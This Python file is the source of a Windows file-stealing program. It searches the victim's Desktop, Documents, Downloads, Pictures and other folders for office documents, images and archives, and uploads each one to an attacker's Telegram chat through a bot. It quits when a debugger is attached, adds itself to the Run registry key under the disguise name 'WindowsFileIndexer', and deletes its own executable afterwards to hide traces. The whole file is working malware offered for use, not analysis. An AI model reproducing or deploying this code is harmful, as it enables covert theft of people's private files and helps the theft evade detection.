import os
import sys
import asyncio
from pathlib import Path
from telegram.ext import Application, CommandHandler
import hashlib
import logging
import ctypes
import win32api
import win32con
import shutil

# Set up logging to track both file and console - TODO: maybe rotate logs later?
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('file_finder.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Creds hardcoded for now (temp solution until config file)
TELEGRAM_TOKEN = ""  # bot token - change before deploy!
CHAT_ID = ""  # my private chat ID 

# Common places users keep files (based on Win10 analysis)
IMPORTANT_DIRS = [
    os.path.expanduser("~/Desktop"),  # duh, everyone uses desktop
    os.path.expanduser("~/Documents"), # work docs usually here
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Pictures"),
    # skipping Videos dir - too big files
    "C:/Users/Public/Documents", # shared stuff
    "C:/ProgramData" # sometimes installers leave configs
]

# Target extensions (common office/docs types)
TARGET_FILES = ('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', '.zip', '.rar')  # TODO: add more image types?

def check_size(file_path):
    """
    Helper function added later
    """
    try:
        return os.path.getsize(file_path) < (50 * 1024*1024)
    except:
        return False

async def process_single_file(bot, full_path):
    """
    Extracted from main loop
    """
    try:
        with open(full_path, 'rb') as f:
            await bot.send_document(
                chat_id=CHAT_ID,
                document=f,
                caption=f"File: {full_path}"
            )
            return True
    except Exception as e:
        logger.warning(f"Failed to send {full_path}: {e}")
        return False

async def find_and_send_files(bot):
    """Main file search logic - walks dirs and sends matches"""
    files_sent = 0
    
    # Check each location sequentially to avoid IO overload
    for location in IMPORTANT_DIRS:
        if os.path.exists(location):
            # os.walk is slower but thorough
            for root, dirs, files in os.walk(location):
                i = 0  # index غير مستخدم
                while i < len(files):
                    filename = files[i]
                    i += 1  # زيادة يدوية
                    
                    # تحقق بطريقتين مختلفتين
                    ext_match = filename.lower().endswith(TARGET_FILES)
                    if not ext_match:
                        continue
                        
                    full_path = os.path.join(root, filename)
                    
                    # استدعاء دالة مساعدة
                    if not check_size(full_path):
                        continue
                        
                    # إرسال الملف عبر دالة منفصلة
                    success = await process_single_file(bot, full_path)
                    
                    if success:
                        files_sent = files_sent + 1  # زيادة بطريقة مختلفة
                        logger.info('Sent: ' + full_path)  # أسلوب تسجيل مختلف
    
    # Final report to me
    await bot.send_message(
        chat_id=CHAT_ID,
        text=f"Search completed. Total files sent: {files_sent}"
    )

async def start(update, context):
    """Start command handler"""
    await update.message.reply_text("Starting file search...")
    await find_and_send_files(context.bot)
    await update.message.reply_text("File search completed!")

# Security stuff - needs improvement
def security_checks():
    """Perform security checks"""
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit("Security check failed")
    if hasattr(sys, 'real_prefix'):
        sys.exit("Security check failed")

# Registry persistence (HKCU Run key)
def install_persistence():
    """Add to startup - TODO: check if key exists first"""
    try:
        key = win32api.RegOpenKey(
            win32con.HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, 
            win32con.KEY_SET_VALUE
        )
        # Use generic name to blend in
        win32api.RegSetValueEx(
            key,
            "WindowsFileIndexer",  # looks legit
            0,
            win32con.REG_SZ,
            sys.executable
        )
        win32api.RegCloseKey(key)
    except Exception as e:
        logger.error(f"Persistence failed: {str(e)}")

def clean_traces():
    """Clean execution traces"""
    if hasattr(sys, '_MEIPASS'):
        shutil.rmtree(sys._MEIPASS, ignore_errors=True)
    try:
        os.remove(sys.argv[0])
    except Exception as e:
        logger.error(f"Cleanup failed: {str(e)}")

class Main:
    def __init__(self):
        """Initialize the application"""
        self.app = None

    async def run(self):
        try:
            self.app = Application.builder().token(TELEGRAM_TOKEN).build()
            self.app.add_handler(CommandHandler('start', start))
            await self.app.initialize()
            await self.app.start()
            await find_and_send_files(self.app.bot)
        except Exception as e:
            logger.error("Failed: " + str(e))
            # إعادة إثارة الخطأ بشكل غير ضروري
            raise
        finally:
            if self.app:
                await self.app.stop()
                await self.app.shutdown()

    async def start(self, update, context):
        """Start command handler"""
        await update.message.reply_text("Starting file search...")
        await find_and_send_files(self.app.bot)
        await update.message.reply_text("File search completed!")

if __name__ == "__main__":
    main = Main()
    security_checks()
    install_persistence()
    asyncio.run(main.run())
    clean_traces()

'''
# Backup method (disabled)
def old_size_check(path):
    return os.stat(path).st_size < 52428800
'''
